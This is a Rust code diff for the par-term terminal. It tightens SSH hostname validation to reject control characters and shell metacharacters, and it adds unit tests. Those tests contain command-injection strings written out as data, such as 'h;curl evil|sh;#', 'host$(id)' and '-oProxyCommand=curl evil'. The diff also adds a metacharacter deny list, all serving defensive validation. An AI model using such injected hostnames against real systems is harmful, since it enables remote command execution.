@@ -275,15 +275,30 @@ fn is_denied_ssh_token(tok: &str) -> bool {
     false
 }
 
-/// True if `host` is safe to interpolate into an SSH argv (SEC-007).
+/// Shell metacharacters that never appear in a legitimate hostname.
+///
+/// Kept in sync with `is_safe_ssh_component` in `par-term-ssh/src/types.rs`,
+/// which enforces the same set for discovered (Quick Connect) hosts.
+/// `par-term-ssh` is a leaf crate with no dependency on `par-term-config`, so
+/// the predicate is intentionally duplicated rather than shared.
+const SHELL_METACHARACTERS: [char; 9] = [';', '|', '&', '$', '`', '(', ')', '<', '>'];
+
+/// True if `host` is safe to interpolate into an SSH argv (SEC-007) or a
+/// shell command line (SEC-003).
 ///
 /// Rejects:
 /// - leading `-`: parsed as a flag by SSH, enabling `-oProxyCommand=...`
 ///   injection from a profile YAML.
-/// - embedded `\n` / `\r` / `\0`: control characters that could delimit
-///   arguments or smuggle content past argv parsing.
+/// - control characters (including `\n` / `\r` / `\0`): these could delimit
+///   arguments, or submit a command when the host reaches a shell.
+/// - shell metacharacters `; | & $ ` ( ) < >`: not exploitable on the argv
+///   path this profile uses, but no real hostname contains them and the same
+///   value is rendered into shell command lines elsewhere.
 fn is_safe_ssh_host(host: &str) -> bool {
-    !host.starts_with('-') && !host.chars().any(|c| c == '\n' || c == '\r' || c == '\0')
+    !host.starts_with('-')
+        && !host
+            .chars()
+            .any(|c| c.is_control() || SHELL_METACHARACTERS.contains(&c))
 }
 
 /// Tokenize `ssh_extra_args` with shell-style quoting and drop dangerous
@@ -604,7 +619,8 @@ impl Profile {
         if !is_safe_ssh_host(host) {
             log::warn!(
                 "[SEC-007] refusing to build SSH argv for profile {:?}: \
-                 unsafe ssh_host {:?} (leading '-' or embedded newline/NUL)",
+                 unsafe ssh_host {:?} (leading '-', control character, \
+                 or shell metacharacter)",
                 self.name,
                 host
             );
@@ -666,15 +682,15 @@ impl Profile {
         }
 
         // SEC-007: ssh_host is formatted directly into the SSH argv, so a
-        // leading `-` (parsed as a flag) or embedded newlines/NUL must be
-        // reported before the profile is saved.
+        // leading `-` (parsed as a flag), control characters, or shell
+        // metacharacters must be reported before the profile is saved.
         if let Some(host) = &self.ssh_host
             && !host.is_empty()
             && !is_safe_ssh_host(host)
         {
             warnings.push(format!(
-                "ssh_host {:?} is unsafe (SEC-007): must not start with '-' \
-                 or contain newline / NUL characters",
+                "ssh_host {:?} is unsafe (SEC-007): must not start with '-', \
+                 or contain control characters or any of ; | & $ ` ( ) < >",
                 host
             ));
         }
@@ -686,5 +702,63 @@ impl Profile {
 impl Default for Profile {
     fn default() -> Self {
         Self::new("New Profile")
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn safe_hosts_are_accepted() {
+        for host in [
+            "example.com",
+            "prod.internal",
+            "10.0.0.4",
+            "fe80::1",
+            "host-1_a.local",
+        ] {
+            assert!(is_safe_ssh_host(host), "expected {host:?} to be accepted");
+        }
+    }
+
+    #[test]
+    fn shell_metacharacters_are_rejected() {
+        for host in [
+            "h;curl evil|sh;#",
+            "host;id",
+            "host|id",
+            "host&id",
+            "host$(id)",
+            "host`id`",
+            "host$IFS",
+            "host<in",
+            "host>out",
+        ] {
+            assert!(!is_safe_ssh_host(host), "expected {host:?} to be rejected");
+        }
+    }
+
+    #[test]
+    fn control_characters_and_leading_dash_are_rejected() {
+        assert!(!is_safe_ssh_host("host\nid"));
+        assert!(!is_safe_ssh_host("host\rid"));
+        assert!(!is_safe_ssh_host("host\0id"));
+        assert!(!is_safe_ssh_host("host\tid"));
+        assert!(!is_safe_ssh_host("-oProxyCommand=curl evil"));
+    }
+
+    #[test]
+    fn unsafe_ssh_host_blocks_argv_and_is_reported_by_validate() {
+        let mut profile = Profile::new("evil");
+        profile.ssh_host = Some("h;curl evil|sh;#".to_string());
+
+        assert!(profile.ssh_command_args().is_none());
+        assert!(
+            profile
+                .validate()
+                .iter()
+                .any(|w| w.contains("is unsafe (SEC-007)"))
+        );
     }
 }
